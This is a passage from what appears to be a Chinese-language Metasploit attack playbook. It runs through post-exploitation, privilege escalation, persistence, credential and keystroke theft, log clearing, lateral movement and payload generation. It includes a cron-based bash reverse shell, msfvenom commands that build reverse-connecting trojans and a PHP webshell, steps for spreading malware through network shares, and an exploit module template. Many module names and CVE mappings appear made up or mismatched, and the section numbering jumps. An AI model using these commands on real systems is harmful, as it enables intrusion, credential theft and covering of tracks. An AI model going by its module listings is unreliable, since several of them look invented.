| 枚举系统服务信息       | `post/linux/gather/services`       |
| 抓取文件系统信息       | `post/linux/gather/filesystem`     |
| 收集系统日志文件       | `post/linux/gather/system_logs`    |
| 枚举开放端口         | `post/linux/gather/open_ports`     |
| 收集 Cron 作业内容   | `post/linux/gather/cron_jobs`      |
| 跟踪内存使用情况       | `post/linux/gather/memory_usage`   |
| 用户与配置检查（需root） | `post/linux/gather/hashdump`       |

##### Windows 系统内信息收集模块

| 模块名称            | 模块路径                                       |
| --------------- | ------------------------------------------ |
| 凭证提取            | `post/windows/gather/mimikatz`             |
| 系统信息            | `post/windows/gather/enum_system`          |
| 枚举本地用户账户        | `post/windows/gather/enum_logged_on_users` |
| 枚举系统网络配置信息      | `post/windows/gather/enum_network`         |
| 获取系统主机名         | `post/windows/gather/hostname`             |
| 收集任务计划内容        | `post/windows/gather/enum_scheduled_tasks` |
| 注册表值枚举          | `post/windows/gather/enum_registry`        |
| 枚举系统进程          | `post/windows/gather/enum_processes`       |
| 捕获系统服务信息        | `post/windows/gather/enum_services`        |
| 抓取已安装软件列表       | `post/windows/gather/enum_applications`    |
| 抓取操作系统信息        | `post/windows/gather/os_info`              |
| 抓取防火墙规则         | `post/windows/gather/firewall_rules`       |
| 抓取剪贴板内容         | `post/windows/gather/clipboard`            |
| 收集 Windows 驱动信息 | `post/windows/gather/driver_list`          |
##### Mac系统

| 模块名称   | 模块路径                                 |
| ------ | ------------------------------------ |
| 钥匙串提取  | `post/macOS/gather/keychain_dump`    |
| 查看系统版本 | `system_profiler SPSoftwareDataType` |


#### 4.2、权限提升

##### 4.2.1a、自动提权扫描模块

| 模块名称                              | 模块路径                                   |
| --------------------------------- | -------------------------------------- |
| 收集系统基本信息，检测潜在提权路径                 | `post/linux/gather/enum_system`        |
| 更全面的系统检查，包括内核漏洞、配置错误、服务漏洞等，输出提权建议 | `post/linux/gather/checks`             |
| 内核漏洞利用模块                          | 根据获取到的系统信息，通过`search`命令查找对应内核版本的提权漏洞模块 |
| 查找SUID/SGID文件                     | `post/linux/gather/suid_enum`          |
| 查看程序的环境变量依赖                       | `ltrace`或`strace`                      |

##### 4.2.1b、执行`linpeas.sh`提权扫描脚本
**上传脚本到目标服务器**
- 在 MSF 控制台中进入目标会话的交互式 Shell：
```ruby
sessions -i <会话ID>  # 例如 sessions -i 1
```
- 使用`upload`命令上传本地的`linpeas.sh`（需提前下载脚本到攻击机）：
```bash
msf6 > upload /path/to/linpeas.sh /tmp/linpeas.sh  # 在MSF控制台执行
```
**赋予执行权限并运行**
```bash
chmod +x /tmp/linpeas.sh  # 在目标Shell中执行
./tmp/linpeas.sh  # 运行脚本，等待扫描结果
```

##### 4.2.2、用于提权的其他操作

| 模块名称   | 模块路径                               |
| ------ | ---------------------------------- |
| 上传文件   | `upload /path/to/file`             |
| 下载文件   | `download /path/to/file`           |
| 执行命令   | `execute -f cmd.exe`               |
| 清除日志   | `clearev`                          |
| 进程迁移   | `run post/windows/manage/migrate`  |
| 键盘记录   | `keyscan_start`、`keyscan_dump`     |
| 屏幕截图   | `screengrab`                       |
| 抓取密码哈希 | `run post/windows/gather/hashdump` |


##### 4.2.3、检查漏洞利用模块
Metasploit提供了大量的提权模块，可以根据收集到的系统信息筛选合适的模块进行尝试。
• 搜索提权模块：在MSF控制台中使用`search`命令搜索适用于目标系统的提权模块，例如搜索针对特定内核版本的提权模块。
```plaintext
msf6 > search linux privilege escalation
```
• 选择合适的模块：根据搜索结果选择合适的提权模块，使用`use`命令加载模块。
```plaintext
msf6 > use <模块名称>
```
• 设置必要的参数：使用`set`命令设置模块所需的参数，如`SESSION`参数指定要提权的Meterpreter会话编号。
```plaintext
msf6 exploit(<模块名称>) > set SESSION <会话编号>
```
• 执行模块：使用`run`或`exploit`命令执行提权模块。
```plaintext
msf6 exploit(<模块名称>) > run
```

##### Linux 权限提升模块

| 模块名称                           | 模块路径                                            |
| ------------------------------ | ----------------------------------------------- |
| 直接提权                           | `getsystem`（Meterpreter内置）                      |
| Dirty Cow 权限提升 (CVE-2016-5195) | `exploit/linux/local/dirty_cow`                 |
| OverlayFS 权限提升                 | `exploit/linux/local/overlayfs_priv_esc`        |
| Sudo 权限提升 (CVE-2021-3156)      | `exploit/multi/ssh/sshexec`                     |
| Kernel 2.6 权限提升                | `exploit/linux/local/recvmmsg_priv_esc`         |
| UDEV 权限提升                      | `exploit/linux/local/udev_netlink_priv_esc`     |
| Polkit 权限提升 (CVE-2021-4034)    | `exploit/linux/local/policykit_priv_esc`        |
| CronJob 提权                     | `post/linux/manage/cron_persistence`            |
| Docker 权限提升                    | `post/linux/manage/docker_privilege_escalation` |
| SUID 文件权限提升                    | `post/linux/manage/suid_escalate`               |
| LD_PRELOAD 权限提升方法              | `post/linux/manage/ld_preload`                  |
| 内核漏洞提权                         | `multi/recon/local_exploit_suggester`           |


##### Windows 权限提升模块

| 模块名称                       | 模块路径                                            |
| -------------------------- | ----------------------------------------------- |
| 直接提权                       | `getsystem`（Meterpreter内置）                      |
| UAC绕过                      | `exploit/windows/local/bypassuac_eventvwr`      |
| MS16-032 权限提升              | `exploit/windows/local/ms16_032`                |
| MS17-010 EternalBlue 权限提升  | `exploit/windows/smb/ms17_010_eternalblue`      |
| UAC 绕过 (Bypass)            | `exploit/windows/local/bypassuac`               |
| UAC 绕过 (PSExec)            | `exploit/windows/local/bypassuac_psh`           |
| KiTrap0D 权限提升              | `exploit/windows/local/ms10_015_kitrap0d`       |
| NTUserMessageCall 权限提升     | `exploit/windows/local/ntusermessagecall`       |
| RPCSS 服务权限提升               | `exploit/windows/local/service_permissions`     |
| AlwaysInstallElevated 权限提升 | `exploit/windows/local/always_install_elevated` |
| Token 偷窃 (Stealing Token)  | `post/windows/manage/priv_migrate`              |
| Sticky Keys 后门安装           | `post/windows/manage/sticky_keys`               |
##### Mac系统
1. Rootpipe漏洞：  
   • 模块：`exploit/osx/local/rootpipe`  
   • 使用：`use exploit/osx/local/rootpipe` → `set SESSION <ID>` → `run`。  
2. 权限配置滥用：  
   • 手动检测：`sudo -l` → 利用免密执行的命令（如`python`）。

### 4.3、权限持久化

##### 通用 权限持久化模块

| 模块名称             | 模块路径                                                                                               |
| ---------------- | -------------------------------------------------------------------------------------------------- |
| Web后门（如Webshell） | 生成Webshell：msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=4444 -f raw > shell.php |

##### Linux 权限持久化模块

| 模块名称                   | 模块路径                                                                                             |
| ---------------------- | ------------------------------------------------------------------------------------------------ |
| 创建 Cron 持久化任务          | `post/linux/manage/cron_persistence`                                                             |
| Cron任务                 | `echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'" > /etc/cron.d/persistence` |
| 添加恶意用户账户               | `post/linux/manage/add_user`                                                                     |
| 创建 SSH 持久化秘钥           | `post/linux/manage/sshkey_persistence`                                                           |
| 修改系统启动脚本实现持久化          | `post/linux/manage/startup_script`                                                               |
| 创建隐藏文件用于持久化            | `post/linux/manage/hide_file_persistence`                                                        |
| 注入共享库以实现持久化            | `post/linux/manage/ld_preload_persistence`                                                       |
| 通过 Systemd 创建持久化服务     | `post/linux/manage/systemd_persistence`                                                          |
| 使用 Bash 配置文件实现隐形持久化    | `post/linux/manage/bash_profile_persistence`                                                     |
| 通过 Kernel Module 实现持久化 | `post/linux/manage/kernel_module_persistence`                                                    |

##### Windows 权限持久化模块

| 模块名称                    | 模块路径                                                             |
| ----------------------- | ---------------------------------------------------------------- |
| 服务创建                    | `sc create "UpdateService" binPath="C:\backdoor.exe" start=auto` |
| 创建恶意服务                  | `post/windows/manage/persistence_service`                        |
| 创建启动项                   | `post/windows/manage/persistence_exe`                            |
| 创建注册表启动项                | `post/windows/manage/registry_persistence`                       |
| 注册表启动项                  | `exploit/windows/local/persistence`                              |
| 创建计划任务                  | `post/windows/manage/scheduled_task`                             |
| 创建磁盘隐藏 (卷影机制持久化)        | `post/windows/manage/volume_shadow_copy`                         |
| 创建隐藏账户                  | `post/windows/manage/add_user`                                   |
| 转储并劫持令牌用于持久化            | `post/windows/manage/sticky_keys`                                |
| 停止 UAC 提高权限后持久 (关闭 UAC) | `post/windows/manage/disable_uac`                                |
| 使用 DLL 注入实现持久化          | `post/windows/manage/dll_inject_persistence`                     |
| 使用挂钩键盘的方式持久化            | `post/windows/manage/keyboard_hook`                              |

### 4.4、数据窃取

• 键盘记录：`keyscan_start`（开始记录）、`keyscan_dump`（查看记录）。
• 屏幕截图：`screengrab`
##### Windows 数据窃取模块

| 模块名称                     | 模块路径                                       |
| ------------------------ | ------------------------------------------ |
| 收集 Windows 凭证 (Mimikatz) | `post/windows/gather/credentials/mimikatz` |
| 截取屏幕 (屏幕截图)              | `post/windows/manage/screen_spy`           |
| 抓取 Windows 密码散列          | `post/windows/gather/smart_hashdump`       |
| Chrome 密码收集              | `post/windows/gather/credentials/chrome`   |
| Firefox 密码收集             | `post/firefox/gather/credentials`          |
| Outlook 邮件账户收集           | `post/windows/gather/credentials/outlook`  |
| 收集 Wi-Fi 配置信息            | `post/windows/gather/credentials/wifi`     |
| 抓取 NTFS 文件详细信息           | `post/windows/gather/ntfs_enum`            |
| 抓取本地注册表信息                | `post/windows/gather/enum_registry`        |
| Dump LSASS 进程 (凭证提取)     | `post/windows/gather/lsass_dump`           |
| 执行 Keystroke 捕获 (按键记录器)  | `post/windows/capture/keylog_recorder`     |
| 抓取密码哈希(需要加载`kiwi`模块）     | `post/windows/gather/hashdump`             |

##### Linux 数据窃取模块

| 模块名称                   | 模块路径                                   |
| ---------------------- | -------------------------------------- |
| 提取 SSH 私钥 (SSH 密钥抓取)   | `post/linux/gather/ssh_private_keys`   |
| 截取屏幕 (Linux 桌面屏幕截图)    | `post/linux/manage/screenshot`         |
| 抓取 Shadow 文件（密码散列提取）   | `post/linux/gather/hashdump`           |
| 收集用户环境变量               | `post/linux/gather/env`                |
| Chrome 浏览器数据窃取         | `post/linux/gather/credentials/chrome` |
| 提取 Bash 历史记录           | `post/linux/gather/bash_history`       |
| 安装并加载键盘记录器             | `post/linux/capture/keylog_recorder`   |
| 收集网络配置 (例如网卡配置、IP 地址等) | `post/linux/gather/network_config`     |
| 收集 SYSTEMD 日志信息        | `post/linux/gather/system_logs`        |
| 收集 Apache 日志信息         | `post/linux/gather/apache_logs`        |
| Collect Cron 作业内容      | `post/linux/gather/cron_jobs`          |

### 4.5、痕迹清理

清空Windows事件日志：
```bash
  clearev
```

删除临时文件：
```bash
  rm <文件路径>
```

##### Linux 痕迹清理模块

| 模块名称         | 模块路径                                    |
| ------------ | --------------------------------------- |
| 删除系统日志       | `post/linux/manage/clear_system_logs`   |
| 删除 Bash 历史记录 | `post/linux/manage/clear_bash_history`  |
| 清空 Cron 作业记录 | `post/linux/manage/clear_cron_jobs`     |
| 删除特定文件或目录    | `post/linux/manage/remove_files`        |
| 清理SSH日志      | `post/linux/manage/ssh_authorized_keys` |
| 删除 SSH 访问痕迹  | `post/linux/manage/clear_ssh_logs`      |
| 清理系统缓存文件     | `post/linux/manage/clear_temp_files`    |
| 删除用户最近活动记录   | `post/linux/manage/clear_user_history`  |
| 隐藏文件或目录      | `post/linux/manage/hide_files`          |


##### Windows 痕迹清理模块

| 模块名称               | 模块路径                                        |
| ------------------ | ------------------------------------------- |
| 清除事件日志             | `post/windows/manage/clearev`               |
| 清理事件日志             | `post/windows/manage/clear_event_logs`      |
| 删除系统 Restore Point | `post/windows/manage/remove_restore_points` |
| 清理剪贴板内容            | `post/windows/manage/clear_clipboard`       |
| 删除注册表项             | `post/windows/manage/delete_registry_key`   |
| 清空回收站              | `post/windows/manage/empty_recycle_bin`     |
| 删除恶意服务             | `post/windows/manage/delete_service`        |
| 清理磁盘中的临时文件         | `post/windows/manage/delete_temp_files`     |
| 删除计划任务             | `post/windows/manage/delete_scheduled_task` |
| 隐藏或删除特定文件或目录       | `post/windows/manage/hide_files`            |

## 5、内网横移

### 5.1 获取内网信息
- 内网扫描：  
  在获得边界服务器会话后，添加路由以辨别内网结构：
```bash
  run autoroute -s <目标网段>
```
- 扫描内网开放的共享文件夹：
```bash
  use auxiliary/scanner/smb/smb_enumshares
  set RHOSTS <目标子网>
  run
```

### 5.2 横向移动
- 利用PsExec攻击其他主机：
```bash
  use exploit/windows/smb/psexec
  set SMBUser <用户名>
  set SMBPass <密码>
  set RHOSTS <目标IP>
  run
```
- 利用共享文件夹传播木马：
  使用`msfvenom`生成Payload并上传到共享文件夹：
```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<你的IP> LPORT=<端口> -f exe -o malware.exe
  upload malware.exe <共享文件路径>
```



### Linux 内网横移模块

| 模块名称                                   | 模块路径                                       |
| --------------------------------------- | ------------------------------------------ |
| 利用 SSH 横移                            | `auxiliary/scanner/ssh/ssh_login`          |
| 利用 Telnet 横移                         | `auxiliary/scanner/telnet/telnet_login`    |
| 利用 Cron 进行自动化横移                 | `post/linux/manage/cron_job_creation`      |
| 利用 NFS 服务横移                        | `auxiliary/scanner/nfs/nfs_mount`          |
| 利用远程共享目录枚举横移目标             | `post/linux/gather/shares_enum`            |
| 利用 SSH Key 文件进行横移                | `post/linux/gather/ssh_auth_keys`          |
| 利用 Sudo 缺陷实现横移                   | `post/linux/manage/escalate_with_sudo`     |
| 利用 RPC 横移                            | `auxiliary/scanner/nfs/nfs_rpc_statd`      |
| 利用 ShellShock 漏洞横移                 | `exploit/multi/http/bash_env_exec`         |
| 利用 Samba 服务横移                      | `exploit/multi/samba/usermap_script`       |

### Windows 内网横移模块

| 模块名称                       | 模块路径                                                           |
| -------------------------- | -------------------------------------------------------------- |
| 使用令牌窃取进行横移                 | `post/windows/gather/credentials/mimikatz_token_impersonation` |
| 利用 WMI 进行横移                | `post/windows/manage/wmi_remote_execution`                     |
| 利用 PsExec 进行横移             | `exploit/windows/smb/psexec`                                   |
| Pass-the-Hash              | `exploit/windows/smb/psexec_psh`                               |
| 利用 Remote Desktop (RDP) 横移 | `post/windows/manage/rdp_connect`                              |
| 利用 SMB 服务进行横移              | `exploit/windows/smb/smb_relay`                                |
| 利用 Windows 管理员共享进行横移       | `exploit/windows/smb/smb_login`                                |
| 利用远程注册表枚举横移目标              | `post/windows/gather/enum_reg`                                 |
| 使用 Empire 代理通过 Windows 横移  | `post/multi/manage/http_comm_persistence`                      |
| 使用 MS SQL 横移               | `auxiliary/admin/mssql/mssql_sql`                              |
| 利用 Powershell 进行横移         | `post/windows/manage/powershell_exec`                          |


# 3、自建MSF模块

### 6.1 移植第三方漏洞 POC为MSF模块

MSF支持用户移植外部漏洞利用代码。
##### 查找第三方漏洞 POC

Exploit-DB 通过`searchsploit`命令搜索漏洞利用代码
例如：`searchsploit exchange windows remote`。

##### 转换为MSF模块格式
将第三方漏洞 POC 转化为 Metasploit 模块需要一定的 Ruby 编程经验

#### 步骤 1. 修读并理解 POC
首先你需要完全了解 POC 的工作原理，包括：
- POC 的攻击目标。
- 使用的协议（HTTP、SMTP、TCP 等）。
- 使用的 exploit 技术（缓冲区溢出、注入、文件上传等）。
- 所需参数（如目标地址、端口号、攻击载荷等）。

#### 步骤 2. 确定漏洞攻击面
分析漏洞的各项参数，确定以下内容：
- **是否需要身份认证**：漏洞攻击是否需要敏感信息（例如用户名、密码）。
- **传输协议与端口**：确定通信的协议以及目标的端口号（例如 HTTP 的80或443端口）。
- **目标的响应**：明确攻击成功后目标设备的行为，比如返回的 Exploit 字符串或 Shell。

有了这些分析之后，可以将 POC 转化为 Metasploit 模块所需的逻辑。

#### 步骤 3. 选择合适的模块
Metasploit 中的模块类型如下：
- **Exploit 模块**：主要用于漏洞利用。
- **Auxiliary 模块**：用于信息收集或辅助攻击。
- **Payload 模块**：设计攻击载荷以实现后续控制。
- **Post 模块**：在目标系统取得初步访问权后进行后利用操作。

通常，漏洞利用 POC 转换为 MSF 模块时，需要明确它的类型：
- 如果是直接攻击的代码，可以转换为 **Exploit 模块**。
- 如果是信息收集工具（如探测漏洞状态），可能转换为 **Auxiliary 模块**。

#### 步骤 4. 编写 Metasploit 模块
Metasploit 的模块是基于 **Ruby** 编写的。以下是创建一个基本 Exploit 模块的大致模板。

##### 模块基础代码结构：
```ruby
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient  # 根据漏洞涉及的协议选择合适的模块

  def initialize(info = {})
    super(update_info(info,
      'Name'           => '模块名称',
      'Description'    => %q{
        模块描述，指出目标漏洞的性质，来自的 POC，以及利用目标的具体原理。
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['POC 作者', '你自己'],
      'References'     => [
        ['CVE', '漏洞的 CVE ID，例如 CVE-2023-XXXXX'],
        ['URL', 'POC 的来源链接']
      ],
      'Payload'        => {
        'Compat'        => {
          'PayloadType' => 'java/meterpreter/reverse_tcp',  # 目标载荷类型
          'RequiredCmd' => 'generic/shell_reverse_tcp'      # 需要什么命令
        }
      },
      'Platform'       => 'win', # 目标平台
      'Targets'        => [
        ['Windows', { 'Ret' => 0xdeadbeef }]  # 指定目标类型
      ],
      'DefaultTarget'  => 0 # 默认的目标
    ))

    register_options([
      Opt::RPORT(80), # 注册目标端口
      OptString.new('TARGETURI', [true, '路径', '/example/path'])
    ])
  end

  def check
    # 检查是否能利用漏洞，例如通过发送一个请求
    res = send_request_raw({
      'method' => 'GET',
      'uri'    => datastore['TARGETURI']
    })

    if res && res.code == 200
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    # 核心漏洞利用代码
    print_status('开始漏洞利用')

    payload_data = Rex::Text.encode_base64(payload.raw)

    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => "#{datastore['TARGETURI']}/action",
      'vars_post' => {
        'input' => payload_data
      }
    })

    if res && res.code == 201
      print_good('利用成功！返回：' + res.body)
    else
      fail_with(Failure::Unknown, "漏洞利用失败！返回：" + res.body)
    end
  end
end
```

##### 模块关键部分分析：
1. **`check` 函数**：用来检查目标是否存在漏洞。
2. **`exploit` 函数**：这是模块的核心部分，你需要将 POC 的代码逻辑移植到这里。
3. **参数注册**：如端口号（RPORT）或路径（TARGETURI）。

#### 步骤 5. 测试模块
1. 将模块保存到 Metasploit 的自定义模块路径（例如 `~/.msf4/modules/exploits/`）。
2. 在 Metasploit 控制台中运行以下命令：
   ```bash
   msfconsole
   use exploit/模块路径
   show options
   set RHOST <目标地址>
   set RPORT <目标端口>
   run
   ```
3. 测试模块是否正常工作。如果模块失败，请分析日志输出并进行调试。


# 4、MSF生成Payload

MSF的`msfvenom`工具用于生成各种Payload，例如木马程序。

* 生成Windows木马：
  
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=4444 -f exe -o shell.exe
```

* 监听反弹Shell：
  
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.7
set LPORT 4444
exploit
```


#### Windows 生成 Payload 模块

| 模块名称                                       | 模块路径                                       |
| ------------------------------------------ | ------------------------------------------ |
| 生成 Windows Meterpreter 反向 TCP Shell    | `payload/windows/meterpreter/reverse_tcp`  |
| 生成 Windows Meterpreter 绑定 TCP Shell    | `payload/windows/meterpreter/bind_tcp`     |
| 生成 Windows 普通反向 Shell                | `payload/windows/shell/reverse_tcp`        |
| 生成 Windows 普通绑定 Shell                | `payload/windows/shell/bind_tcp`           |
| 生成 Windows Staged Meterpreter 反向 HTTPS | `payload/windows/meterpreter/reverse_https`|
| 生成 Windows Staged Meterpreter 反向 HTTP  | `payload/windows/meterpreter/reverse_http` |
| 生成 Windows Powershell Meterpreter        | `payload/windows/powershell_reverse_tcp`   |
| 生成 Windows DLL 注入 Payload              | `payload/windows/dllinject/reverse_tcp`    |
| 生成 Windows VNC 注入 Payload              | `payload/windows/vncinject/reverse_tcp`    |

#### Linux 生成 Payload 模块

| 模块名称                                       | 模块路径                                       |
| ------------------------------------------ | ------------------------------------------ |
| 生成 Linux Meterpreter 反向 TCP Shell      | `payload/linux/meterpreter/reverse_tcp`    |
| 生成 Linux 普通反向 Shell                  | `payload/linux/shell/reverse_tcp`          |
| 生成 Linux 普通绑定 Shell                  | `payload/linux/shell/bind_tcp`             |
| 生成 Linux Meterpreter 反向 HTTPS Shell    | `payload/linux/meterpreter/reverse_https`  |
| 生成 Linux Meterpreter 绑定 TCP Shell      | `payload/linux/meterpreter/bind_tcp`       |
| 生成 Linux ELF 文件 Payload                | `payload/linux/x64/meterpreter/reverse_tcp`|
| 生成 Linux RFI Payload                     | `payload/linux/http/meterpreter/reverse_tcp`|
| 生成 Linux Python Meterpreter              | `payload/linux/meterpreter/python/reverse_tcp`|

#### Android 生成 Payload 模块

| 模块名称                                       | 模块路径                                       |
| ------------------------------------------ | ------------------------------------------ |
| 生成 Android APK 文件的 Meterpreter Payload | `payload/android/meterpreter/reverse_tcp`  |
| 生成 Android Meterpreter HTTP Payload      | `payload/android/meterpreter/reverse_http` |

#### macOS (OS X) 生成 Payload 模块

| 模块名称                                       | 模块路径                                       |
| ------------------------------------------ | ------------------------------------------ |
| 生成 macOS Meterpreter 反向 TCP Shell      | `payload/osx/x64/meterpreter/reverse_tcp`  |
| 生成 macOS 普通反向 Shell                  | `payload/osx/x64/shell_reverse_tcp`        |

#### iOS 生成 Payload 模块

| 模块名称                                       | 模块路径                                       |
| ------------------------------------------ | ------------------------------------------ |
| 生成 iOS Meterpreter 反向 TCP Shell        | `payload/ios/armle/meterpreter_reverse_tcp`|

#### 多平台生成 Payload 模块

| 模块名称                                       | 模块路径                                       |
| ------------------------------------------ | ------------------------------------------ |
| 生成通用 Python Meterpreter Payload        | `payload/python/meterpreter/reverse_tcp`   |
| 生成通用 Java Meterpreter Payload          | `payload/java/meterpreter/reverse_tcp`     |
| 生成通用 PHP Meterpreter Payload           | `payload/php/meterpreter/reverse_tcp`      |

### 反弹 Shell 常用模块列表：

| 模块名称                   | 模块路径                                          |
| ---------------------- | --------------------------------------------- |
| Linux Bash Shell 反弹    | `payload/linux/x86/shell_reverse_tcp`         |
| Windows CMD Shell 反弹   | `payload/windows/shell_reverse_tcp`           |
| PHP 反弹 Shell           | `payload/php/meterpreter_reverse_tcp`         |
| Python 反弹 Shell        | `payload/python/meterpreter_reverse_tcp`      |
| Java 反弹 Shell          | `payload/java/meterpreter_reverse_tcp`        |
| Windows Meterpreter 反弹 | `payload/windows/meterpreter_reverse_tcp`     |
| Linux Meterpreter 反弹   | `payload/linux/x86/meterpreter_reverse_tcp`   |
| Android Meterpreter 反弹 | `payload/android/meterpreter_reverse_tcp`     |
| Ruby 反弹 Shell          | `payload/ruby/shell_reverse_tcp`              |
| Windows HTTPS 反弹 Shell | `payload/windows/meterpreter_reverse_https`   |
| NodeJS 反弹 Shell        | `payload/nodejs/shell_reverse_tcp`            |
| Windows DNS 反弹 Shell   | `payload/windows/meterpreter/reverse_dns`     |
| Linux HTTPS 反弹 Shell   | `payload/linux/x86/meterpreter_reverse_https` |
| ASP 反弹 Shell           | `payload/windows/meterpreter/reverse_tcp`     |

